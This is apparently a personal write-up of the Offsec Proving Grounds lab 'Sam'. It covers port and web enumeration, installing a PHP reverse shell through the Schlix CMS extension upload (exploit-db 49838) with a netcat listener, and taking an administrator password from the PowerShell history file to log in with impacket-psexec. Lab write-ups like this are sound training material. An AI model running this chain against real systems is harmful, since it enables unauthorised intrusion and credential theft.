---
title: Sam
date: 2026-02-22T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - psexec
  - impacket
  - mysql
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Sam"
---
nmap -p- 192.168.168.248  --min-rate 5000 

![](Screenshot%202026-02-23%20at%2013.42.16.png)

nmap -p- 192.168.168.248 -sS -sC -sV -A  --min-rate 5000 

![](Screenshot%202026-02-24%20at%2013.45.16.png)
enum4linux-ng -A 192.168.168.248

![](Screenshot%202026-02-23%20at%2013.42.26.png)

gobuster dir -u http://192.168.168.248/  -w /usr/share/wordlists/dirb/common.txt

![](Screenshot%202026-02-23%20at%2013.53.33.png)

![](Screenshot%202026-02-24%20at%2013.43.53.png)

`ffuf -u http://192.168.147.248/testing/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt   -t 100  -recursion -fw 9`

![](Screenshot%202026-02-25%20at%2006.52.28.png)

Lets have a look at the site

![](Screenshot%202026-02-25%20at%2006.52.59.png)

Install mariaDB on your attack machine and start the service

`sudo apt install mariadb`  
`sudo service mysqld start`

`CREATE DATABASE schlixdb;`  
`CREATE USER 'schlix'@'%' IDENTIFIED BY 'schlixpassword';`  
`GRANT ALL PRIVILEGES ON schlixdb.* TO 'schlix'@'%';`  
`FLUSH PRIVILEGES;`  

![](Screenshot%202026-02-25%20at%2009.23.47.png)

If you have trouble with errors(1064), write out the command. I had an issue with the type of quotation mark when pasted directly. 

Change the bind address in the mariaDB config file to: 0.0.0.0 

`sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf`

![](Screenshot%202026-02-25%20at%2009.29.48.png)

Restart MariaDB  
`sudo systemctl restart mariadb`

![](Screenshot%202026-02-25%20at%2009.33.06.png)

Confirm that port 3306 is open:

Add the details to the SchlixDB CMD. 

![](Screenshot%202026-02-25%20at%2009.40.21.png)

![](Screenshot%202026-02-25%20at%2009.44.44.png)

![](Screenshot%202026-02-25%20at%2009.46.54.png)

Navigate to `testing/admin` and sign in using your credentials.

![](Screenshot%202026-02-25%20at%2009.47.34.png)

Follow the instructions from the 49838.txt exploit.  
`cp /usr/share/exploitdb/exploits/multiple/webapps/49838.txt .`

Create a new category in the app: 

![](Screenshot%202026-02-25%20at%2009.55.16.png)

![](Screenshot%202026-02-25%20at%2010.05.58.png)

Use revshells.com to create a php reverse shell. 

![](Screenshot%202026-02-27%20at%2011.02.36.png)

![](Screenshot%202026-02-27%20at%2011.04.02.png)

![](Screenshot%202026-02-27%20at%2011.04.54.png)

![](Screenshot%202026-02-27%20at%2011.05.52.png)

Move into the app_mailchimp-master directory and create zip file with the following name.  
`combo_mailchimp-1_0_1.zip`

![](Screenshot%202026-02-27%20at%2011.07.12.png)

Navigate to the exploit folder you've created and install a new package, select the .zip file you've created and install. This whold process is pretty slow. Be prepared to wait 1-2mins for pages to load. If its been longer than 4 try to figure out where you've gone wrong. 

Make sure you have a listener running

`rlwrap nc -lvnp 1234`

![](Screenshot%202026-02-27%20at%2011.56.32.png)

Once the package has been installed there is a button to 'activate' the extension. Click activate and save. Then click on the package icon, find the 'About' tab in the next screen. Once you've selected it you should see your shell within a minuite.


![](Screenshot%202026-02-26%20at%2011.21.03.png)

![](Screenshot%202026-02-26%20at%2011.20.12.png)

![](Screenshot%202026-02-26%20at%2011.39.38.png)

I uploaded a malicious exe and dll file, restarted the machine but when the shell I wasn't signed in as nt-authority. I then had to pivot to a different tactic. 

This was fruitless:  
`wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """`

I found this directory using this powershell command:

`(Get-PSReadlineOption).HistorySavePath`

`type C:\Users\sam\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

![](Screenshot%202026-02-27%20at%2010.54.56.png)

I followed the history to find the config file where the password was in plaintext

![](Screenshot%202026-02-27%20at%2007.18.50.png)

SeriousSAM14

![](Screenshot%202026-02-27%20at%2007.07.04.png)

![](Screenshot%202026-02-27%20at%2007.06.01.png)

`impacket-psexec 'Administrator:SeriousSAM14@192.168.214.248'`

![](Screenshot%202026-02-27%20at%2007.17.55.png)
